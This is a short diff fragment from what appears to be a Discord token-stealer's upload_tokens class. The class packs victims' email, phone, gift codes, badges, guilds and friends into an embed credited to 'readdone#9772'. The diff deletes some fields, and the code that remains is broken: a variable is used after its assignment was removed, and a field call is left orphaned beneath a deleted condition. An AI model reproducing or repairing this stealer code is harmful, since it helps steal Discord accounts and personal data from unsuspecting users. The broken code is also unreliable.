@@ -301,7 +301,6 @@ class upload_tokens:
                         hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                             friend['user']['public_flags'])[::-1]])
 
-                        data = f"```{friend['user']['username']['user']['discriminator']}```"
 
                         if len('\n'.join(hq_friends)) + len(data) >= 1024:
                             break
@@ -350,12 +349,6 @@ class upload_tokens:
             embed.add_field(name="Email", value=f"```{email if email != None else 'None'}```", inline=True)
             embed.add_field(name="Phone", value=f"```{phone if phone != None else 'None'}```", inline=True)    
 
-
-            if hq_guilds != None:
-                embed.add_field(name="HQ Guilds", value=hq_guilds, inline=False)
-            if hq_friends != None:
-                embed.add_field(name="HQ Friends", value=hq_friends, inline=False)
-            if codes != None:
                 embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
             embed.set_footer(text="Created by: readdone#9772")
 
